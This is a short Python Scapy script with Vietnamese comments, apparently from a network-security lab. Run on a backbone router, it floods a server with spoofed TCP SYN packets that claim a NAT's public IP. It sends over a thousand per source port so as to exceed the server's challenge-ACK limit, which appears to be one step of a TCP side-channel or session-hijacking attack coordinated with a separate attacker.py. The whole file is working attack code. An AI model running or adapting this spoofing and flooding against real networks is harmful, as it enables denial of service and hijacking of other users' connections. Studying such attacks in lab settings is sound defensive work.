#!/usr/bin/env python3
"""
backbone_flood.py — Chạy trên Backbone Router
Gửi spoofed SYN từ eth0 (VMnet10) trực tiếp đến Server.
Không bị rp_filter vì gói đi ra từ interface nội bộ, không forward.
"""
from scapy.all import IP, TCP, send
import random, time

NAT_PUBLIC_IP = "1.1.1.1"
SERVER_IP     = "1.1.1.10"
SERVER_PORT   = 8080
IFACE         = "eth0"          # Interface của Backbone trên VMnet10
EPHEM_START   = 40000
EPHEM_END     = 40011
LIMIT         = 1100            # Phải > tcp_challenge_ack_limit của Server

print(f"[Backbone Flood] Flooding {SERVER_IP}:{SERVER_PORT} from {IFACE}")
print(f"Spoofed src: {NAT_PUBLIC_IP}, ports {EPHEM_START}-{EPHEM_END-1}")
print("Bắt đầu sau 3 giây... (để attacker.py kịp setup spy)")
time.sleep(3)

for port in range(EPHEM_START, EPHEM_END):
    time.sleep(1.2)  # Đợi counter reset
    pkts = [IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) /
            TCP(sport=port, dport=SERVER_PORT, flags="S",
                seq=random.randint(0, 2**32-1))
            for _ in range(LIMIT)]
    send(pkts, iface=IFACE, verbose=False, inter=0)
    print(f"  Sent {LIMIT} SYN → port {port}")
